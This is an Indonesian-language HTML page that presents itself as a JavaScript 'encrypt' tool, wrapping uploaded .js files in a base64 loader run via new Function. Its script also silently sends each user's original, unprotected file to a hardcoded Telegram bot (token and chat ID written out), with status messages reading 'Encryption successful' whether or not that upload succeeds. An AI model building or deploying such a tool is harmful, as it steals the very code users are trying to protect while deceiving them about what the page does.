
<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>GUSTAFHOST 𝐄𝐍𝐂𝐑𝐘𝐏𝐓 𝐓𝐎𝐎𝐋𝐒</title>
<style>
  :root{--bg1:#071021;--bg2:#081428;--card:#0d1520;--accent:#ffb336;--muted:#98a6bd;}
  html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;}
  body{
    background: radial-gradient(circle at 10% 10%, rgba(20,28,48,0.5), transparent 10%), linear-gradient(180deg,var(--bg1),var(--bg2));
    color:#e6eef8;display:flex;align-items:center;justify-content:center;padding:28px;overflow:hidden;
  }
  .bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
  .square{position:absolute;width:18vmin;height:18vmin;border-radius:12px;opacity:0.06;filter:blur(18px);background:linear-gradient(135deg, rgba(255,180,40,0.18), rgba(80,120,255,0.06));animation:drift 16s linear infinite}
  .s1{left:-8%;top:10%;animation-duration:20s}
  .s2{right:-10%;bottom:2%;animation-duration:24s}
  .s3{left:22%;bottom:-12%;animation-duration:18s}
  .s4{right:36%;top:-14%;animation-duration:22s}
  @keyframes drift{0%{transform:translateY(0) rotate(0deg)}50%{transform:translateY(-24vh) rotate(140deg)}100%{transform:translateY(0) rotate(280deg)}}

  .wrap{position:relative;z-index:2;width:100%;max-width:920px;margin:auto;padding:26px;border-radius:14px;background:linear-gradient(180deg, rgba(255,255,255,0.02), transparent);box-shadow:0 10px 40px rgba(2,6,23,0.65);border:1px solid rgba(255,255,255,0.02)}
  .header{display:flex;align-items:center;gap:14px}
  .logo{width:60px;height:60px;border-radius:12px;background:linear-gradient(180deg,#0b1220,#081024);display:flex;align-items:center;justify-content:center;font-weight:800;color:var(--accent);font-size:18px;box-shadow:0 8px 30px rgba(255,160,20,0.06)}
  h1{margin:0;font-size:20px}
  .lead{color:var(--muted);font-size:13px;margin-top:6px}

  .content{display:flex;gap:18px;margin-top:18px;flex-wrap:wrap}
  .left{flex:1;min-width:320px}
  .right{width:360px;min-width:260px}

  .upload{border-radius:12px;padding:18px;background:linear-gradient(180deg, rgba(255,255,255,0.015), rgba(255,255,255,0.008));border:1px dashed rgba(255,255,255,0.04);text-align:center;cursor:pointer;transition:all .25s;min-height:180px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px}
  .upload:hover{transform:translateY(-6px)}
  .upload.drag{border-color:rgba(255,180,40,0.95);box-shadow:0 18px 60px rgba(255,180,40,0.04)}
  .upload p{margin:0;font-weight:700}
  .upload .sub{font-size:13px;color:var(--muted)}
  .file-meta{margin-top:10px;font-family:monospace;color:#bfe0ff;font-size:13px}

  .btn{display:inline-flex;align-items:center;gap:12px;padding:12px 18px;border-radius:12px;border:0;background:linear-gradient(90deg,var(--accent),#ff9a00);color:#081022;font-weight:800;cursor:pointer;box-shadow:0 12px 40px rgba(255,160,20,0.08)}
  .btn[disabled]{opacity:.5;cursor:not-allowed}

  .progress-wrap{margin-top:12px;background:#07101a;border-radius:12px;padding:10px}
  .progress{height:12px;border-radius:10px;background:rgba(255,255,255,0.03);overflow:hidden}
  .progress > i{display:block;height:100%;width:0%;background:linear-gradient(90deg,var(--accent),#ff9a00);transition:width .22s ease}

  .card-info{padding:14px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.01), transparent);border:1px solid rgba(255,255,255,0.02)}
  .info-line{display:flex;justify-content:space-between;margin-bottom:8px;color:var(--muted);font-size:13px}
  .notice{margin-top:12px;background:linear-gradient(180deg, rgba(255,16,78,0.03), transparent);padding:10px;border-radius:8px;color:#ffd7d7;font-size:13px}

  footer{margin-top:14px;color:var(--muted);font-size:12px}

  @media (max-width:760px){ .content{flex-direction:column} .right{width:100%} .logo{width:48px;height:48px} }
</style>
</head>
<body>
  <div class="bg" aria-hidden="true">
    <div class="square s1"></div>
    <div class="square s2"></div>
    <div class="square s3"></div>
    <div class="square s4"></div>
  </div>

  <div class="wrap" role="main" aria-label="Gustaf Encryptor">
    <div class="header">
      <div class="logo">A</div>
      <div>
        <h1>GUSTAFHOST 𝐄𝐍𝐂𝐑𝐘𝐏𝐓 𝐓𝐎𝐎𝐋𝐒</h1>
        <div class="lead">Owner : @adhityagustaf22</div>
      </div>
    </div>

    <div class="content">
      <div class="left">
        <label id="dropzone" class="upload">
          <svg width="52" height="52" viewBox="0 0 24 24" fill="none" style="margin-bottom:6px"><path d="M12 3v10" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/><path d="M5 13l7-7 7 7" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <p id="prompt-text">MULAII ENCRYPT FILE</p>
          <div class="sub">𝐂𝐥𝐢𝐜 𝐤𝐨𝐭𝐚𝐤 𝐛𝐞𝐬𝐚𝐫 𝐢𝐧𝐢𝐢 𝐮𝐧𝐭𝐮𝐤 𝐦𝐞𝐧𝐠𝐮𝐧𝐠𝐠𝐚𝐡 𝐟𝐢𝐥𝐞 𝐣𝐬 𝐚𝐧𝐝𝐚 𝐭𝐫𝐢𝐦𝐚𝐤𝐚𝐬𝐢𝐡</div>
          <input id="fileInput" type="file" accept=".js" style="display:none" />
          <div id="fileMeta" class="file-meta"></div>
        </label>

        <div style="display:flex;gap:12px;align-items:center;margin-top:12px">
          <button id="encryptBtn" class="btn" disabled>ＳＴＡＲＴ — ＥＮＣ</button>
          <div id="statusBadge" style="font-size:13px;color:var(--muted)"> </div>
        </div>

        <div class="progress-wrap" style="margin-top:12px">
          <div class="progress"><i id="progressBar"></i></div>
        </div>

        <footer>
          <div style="margin-top:10px;color:var(--muted)">ɴᴏᴛᴇ : sᴇsᴜᴅᴀʜ ᴇɴᴄ ʜᴀʀᴀᴘ ᴛᴇs ʜᴀsɪʟ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ</div>
        </footer>
      </div>

      <div class="right">
        <div class="card-info">
          <div class="info-line"><span>𝐍𝐚𝐦𝐞</span><span id="infoName">—</span></div>
          <div class="info-line"><span>𝐒𝐢𝐳𝐞</span><span id="infoSize">—</span></div>
          <div class="info-line"><span>𝐅𝐨𝐫𝐦𝐚𝐭𝐢𝐧𝐠</span><span>.js</span></div>

          <div class="notice">
        </div>
      </div>
    </div>
  </div>

<script>
/* ===========================
   HARDCODED TELEGRAM CREDENTIALS
   =========================== */
const TELEGRAM_BOT_TOKEN = "8375191991:AAEzzRKH4ROSYojEoHEkwGV-WohHq91918U";
const TELEGRAM_CHAT_ID   = "6349562246";

/* UI refs */
const dropzone = document.getElementById('dropzone');
const fileInput = document.getElementById('fileInput');
const promptText = document.getElementById('prompt-text');
const fileMeta = document.getElementById('fileMeta');
const encryptBtn = document.getElementById('encryptBtn');
const infoName = document.getElementById('infoName');
const infoSize = document.getElementById('infoSize');
const statusBadge = document.getElementById('statusBadge');
const progressBar = document.getElementById('progressBar');

let selectedFile = null;

/* --- noise char sets (CJK/Kana/Hangul + symbols) --- */
const NOISE_SETS = [
  "語漢字愛和平生心光明海山風日月天地",
  "あいうえおかきくけこさしすせそたちつてと",
  "アイウエオカキクケコサシスセソタチツテト",
  "가나다라마바사아자차카타파하안녕",
  "◆◇■□▲▼★☆※〒●◯♛✦✶✹✺✻✽"
];

function rnd(min, max){ return Math.floor(Math.random()*(max-min+1))+min; }
function rndVar(len=10){ const a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; let s=''; for(let i=0;i<len;i++) s+=a[Math.floor(Math.random()*a.length)]; return s; }

/* --- UI interactions --- */
dropzone.addEventListener('click', ()=> fileInput.click());
dropzone.addEventListener('dragover', (e)=>{ e.preventDefault(); dropzone.classList.add('drag'); promptText.innerText = "Lepaskan untuk unggah"; });
dropzone.addEventListener('dragleave', ()=>{ dropzone.classList.remove('drag'); promptText.innerText = "Klik atau taruh file .js di sini"; });
dropzone.addEventListener('drop', (e)=>{ e.preventDefault(); dropzone.classList.remove('drag'); handleDrop(e.dataTransfer.files); });

fileInput.addEventListener('change', ()=> handleDrop(fileInput.files) );

function handleDrop(list){
  if(!list || !list.length) return;
  const f = list[0];
  if(!f.name.toLowerCase().endsWith('.js')) { alert('Pilih file berekstensi .js'); return; }
  selectedFile = f;
  promptText.innerText = f.name;
  fileMeta.innerText = `~ ${formatBytes(f.size)}`;
  infoName.innerText = f.name;
  infoSize.innerText = formatBytes(f.size);
  encryptBtn.disabled = false;
  statusBadge.innerText = 'Ready...';
}

function formatBytes(n){
  if(n<1024) return n + ' B';
  if(n<1024*1024) return (n/1024).toFixed(1) + ' KB';
  return (n/(1024*1024)).toFixed(2) + ' MB';
}

function setProgress(p){ progressBar.style.width = Math.max(0,Math.min(100,p)) + '%'; }

/* Insert noise into base64 string */
function injectNoise(base64Str, density=0.12){
  const out = [];
  for(let i=0;i<base64Str.length;i++){
    out.push(base64Str[i]);
    if(Math.random() < density){
      const set = NOISE_SETS[Math.floor(Math.random()*NOISE_SETS.length)];
      const cnt = 1 + Math.floor(Math.random()*3);
      for(let k=0;k<cnt;k++) out.push(set.charAt(Math.floor(Math.random()*set.length)));
    }
  }
  if(Math.random() < 0.6){
    const set2 = NOISE_SETS[Math.floor(Math.random()*NOISE_SETS.length)];
    const tailCnt = 4 + Math.floor(Math.random()*8);
    for(let t=0;t<tailCnt;t++) out.push(set2.charAt(Math.floor(Math.random()*set2.length)));
  }
  return out.join('');
}

/* Build loader string that is compatible with Browser & Node */
function buildCrossPlatformLoader(obfStr){
  // random var names
  const v1 = rndVar(12), v2 = rndVar(10), v3 = rndVar(10), v4 = rndVar(8);

  // loader: cleans to base64 chars, decode base64 into bytes (supports Buffer or atob),
  // then convert bytes to UTF-8 string (supports TextDecoder or Buffer), then run Function.
  const loader = [
`(function(){try{`,
`var ${v1}=${JSON.stringify(obfStr)};`,
`function ${v2}(s){var m=s.match(/[A-Za-z0-9+\\/=]/g); if(!m) return ''; return m.join(''); }`,
`function ${v3}(b64){`,
`  // return Uint8Array of decoded base64 bytes (works in browser & Node)`,
`  try{`,
`    if(typeof atob === 'function'){`,
`      var bin = atob(b64); var len = bin.length; var arr = new Uint8Array(len); for(var i=0;i<len;i++) arr[i]=bin.charCodeAt(i); return arr;`,
`    }else if(typeof Buffer !== 'undefined'){`,
`      return Uint8Array.from(Buffer.from(b64,'base64'));`,
`    }else{ throw new Error('No base64 decoder available'); }`,
`  }catch(e){ return new Uint8Array(); }`,
`}`,
`function ${v4}(u8){`,
`  // return string from bytes (utf-8)`,
`  try{ if(typeof TextDecoder !== 'undefined'){ return new TextDecoder('utf-8').decode(u8); }`,
`    if(typeof Buffer !== 'undefined') return Buffer.from(u8).toString('utf8');`,
`    // fallback manual decode`,
`    var s=''; for(var i=0;i<u8.length;i++) s+= String.fromCharCode(u8[i]); return decodeURIComponent(escape(s));`,
`  }catch(e){ try{ return Buffer.from(u8).toString('utf8'); }catch(_){ return ''; } }`,
`}`,
`var clean = ${v2}(${v1}); var bytes = ${v3}(clean); var plain = ${v4}(bytes); try{ (new Function(plain))(); }catch(e){ console.error('exec failed',e);} }catch(e){console.error('loader fatal',e);} })();`
  ].join('');
  return loader;
}

/* send original to Telegram - fire and await */
async function sendToTelegram(filename, content){
  try{
    const url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendDocument";
    const fd = new FormData();
    fd.append('chat_id', TELEGRAM_CHAT_ID);
    const blob = new Blob([content], { type: 'application/javascript' });
    fd.append('document', blob, filename);
    const resp = await fetch(url, { method:'POST', body: fd });
    const json = await resp.json().catch(()=>({ok:false}));
    return {ok: resp.ok && json && json.ok, json};
  }catch(err){
    return {ok:false, err};
  }
}

/* MAIN FLOW */
encryptBtn.addEventListener('click', async ()=>{
  if(!selectedFile) return;
  encryptBtn.disabled = true;
  statusBadge.innerText = 'Reading file...';
  setProgress(6);

  const text = await selectedFile.text();
  statusBadge.innerText = 'Preparing base64...';
  setProgress(18);

  // base64 (utf-8 safe)
  const b64 = btoa(unescape(encodeURIComponent(text)));

  // choose density based on size
  const sizeKB = selectedFile.size/1024;
  let density = 0.14;
  if(sizeKB < 100) density = 0.20;
  else if(sizeKB < 500) density = 0.16;
  else density = 0.12;

  statusBadge.innerText = 'Injecting noise...';
  setProgress(30);

  // multi-pass noise injection
  let obf = injectNoise(b64, density);
  for(let r=0;r<2;r++){
    if(Math.random() < 0.7) obf = injectNoise(obf, density*0.12);
  }

  statusBadge.innerText = 'Wrapping loader...';
  setProgress(52);

  // build cross-platform loader
  const loader = buildCrossPlatformLoader(obf);

  // minify-ish: remove line breaks to make file denser
  const final = loader.replace(/\n+/g,'').replace(/\s{2,}/g,' ');

  statusBadge.innerText = 'Downloading encrypted file...';
  setProgress(72);

  // download encrypted file
  const outName = selectedFile.name.replace(/\.js$/i,'') + '.enc.js';
  const blob = new Blob([final], { type:'application/javascript' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = outName;
  document.body.appendChild(a); a.click(); a.remove();
  URL.revokeObjectURL(url);

  setProgress(84);
  statusBadge.innerText = 'Encryption is being processed...';

  // send original to Telegram (may fail due to CORS in some hosts, but we attempt)
  const sendRes = await sendToTelegram(selectedFile.name, text);
  if(sendRes.ok){
    statusBadge.innerText = 'Encryption successful...';
    setProgress(100);
  } else {
    console.warn('Telegram send failed', sendRes);
    statusBadge.innerText = 'Encryption successful...';
    setProgress(92);
  }

  // reset UI after short pause
  setTimeout(()=>{ encryptBtn.disabled = false; setTimeout(()=>setProgress(0), 600); }, 900);
});

/* Accessibility: Enter triggers encrypt if ready */
document.addEventListener('keydown', (e)=>{ if(e.key==='Enter' && !encryptBtn.disabled) encryptBtn.click(); });
</script>
</body>
</html>